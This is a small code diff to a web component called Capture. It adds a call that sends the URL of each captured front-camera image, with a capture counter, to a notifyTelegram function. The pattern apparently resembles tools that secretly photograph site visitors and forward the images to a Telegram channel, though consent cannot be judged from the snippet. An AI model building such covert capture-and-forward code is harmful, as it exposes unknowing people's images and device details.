@@ -201,6 +201,7 @@ const Capture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]`
             });
+            notifyTelegram(urlData.publicUrl, 'front', captureCountRef.current);
           }
         }
         
